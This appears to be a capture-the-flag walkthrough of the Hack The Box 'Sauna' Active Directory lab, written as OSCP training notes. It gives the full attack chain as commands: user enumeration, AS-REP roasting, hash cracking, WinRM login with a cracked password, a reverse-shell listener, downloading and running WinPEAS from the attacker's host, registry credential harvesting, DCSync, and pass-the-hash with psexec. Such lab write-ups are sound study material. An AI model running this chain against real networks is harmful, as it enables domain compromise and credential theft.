---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Sauna?tab=machine_info
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Sauna-1791211996898.webp)

![263](../../0.%20Assets/Sauna-1791212003944.webp)

---

# Walkthrough



Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap $T -sS -Pn -n -p- --min-rate 5000 -oG openPorts.gmap -vvv
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap $T -Pn -n -sVC  --min-rate 3000 -oN results.txt -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49688,49696
```

The usual Active Directory services.

```
netexec smb $T

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
```


Let's add the domain we found to `/etc/hosts`, since `kerberos` usually needs name resolution.

![](../../0.%20Assets/Sauna-1791212433483.webp)

Let's enumerate with netexec using the anonymous and guest users.

None of the combinations worked, so I moved to RPC and still couldn't get anywhere.

Then I noticed the AD host is also serving a website.
![](../../0.%20Assets/Sauna-1791212836295.webp)

I ran some directory brute forcing while also checking for things like `robots.txt`.

```
gobuster dir -u http://$T -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_dire
ctory-list-2.3-medium.txt -t 50
```

While dirbuster was running, I found something interesting.

![](../../0.%20Assets/Sauna-1791213011587.webp)


Let's generate a list of possible usernames with this tool: [AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator?utm_source=chatgpt.com)

Let's build a list of names and run the tool.

![](../../0.%20Assets/Sauna-1791213230283.webp)

```
git clone https://github.com/mohinparamasivam/AD-Username-Generator.git

touch possibleUsers.txt
python3 username-generate.py -u ../possible_users.txt -o possibleUsers.txt
```

![](../../0.%20Assets/Sauna-1791213368723.webp)

Now we have a list of candidate usernames. Let's find out which ones actually exist.

```
./kerbrute userenum --dc $T -d egotistical-bank.local possibleUsers.txt
```

![](../../0.%20Assets/Sauna-1791213699436.webp)

And we have a valid user.

Let's add it to a list to track credentials.

The next logical step is to `as-rep` roast and try to grab the hash for `Fsmith`.

```
impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/Fsmith' \             
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Sauna-1791213905027.webp)

We got a hash.

Let's crack it.

```
hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
```

![](../../0.%20Assets/Sauna-1791213981693.webp)

Now let's see what these credentials get us.

I used [nxcspray](https://github.com/NTHSec/nxcspray) to test every protocol with these credentials.

```
./nxcspray all $T -u 'Fsmith' -p 'Thestrokes23'
```

![](../../0.%20Assets/Sauna-1791214233233.webp)

We can connect remotely over `WINRM`, so let's use `evil-winrm` for that.

```
evil-winrm -i $T -u Fsmith -p 'Thestrokes23'
```

![](../../0.%20Assets/Sauna-1791214381991.webp)

As usual, I like to use `penelope` for reverse shells.

```
penelope -O -p 1337 -a -i tun0
```

![](../../0.%20Assets/Sauna-1791214466671.webp)


![](../../0.%20Assets/Sauna-1791214608468.webp)

And there we find the flag.

Now I'll collect data for BloodHound. I wanted to try `rusthound-ce`, and it worked really well. I'd recommend it.

```
 ./rusthound-ce -d EGOTISTICAL-BANK.LOCAL -u 'Fsmith@EGOTISTICAL-BANK.LOCAL' -p 'Thestrokes23' -f $T -z
```


![](../../0.%20Assets/Sauna-1791217668385.webp)

I don't see an obvious path, so let's do some enumeration. `PowerUp` kept breaking the session, so I tried `winPEAS`, which also broke it, so I dropped out of Penelope.

``
```
iwr -uri http://10.10.15.226/WinPEASx64.exe -Outfile WinPEASx64.exe

./WinPEASx64.exe
```

I found some auto-logon credentials.
We can see more detail with this command.

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

![](../../0.%20Assets/Sauna-1791222811125.webp)

![](../../0.%20Assets/Sauna-1791222857499.webp)

And thanks to our enumeration in BloodHound, we find we can perform a `DCSync` against the domain.


![](../../0.%20Assets/Sauna-1791224159891.webp)

```
impacket-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.158.187 -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

![](../../0.%20Assets/Sauna-1791224338543.webp)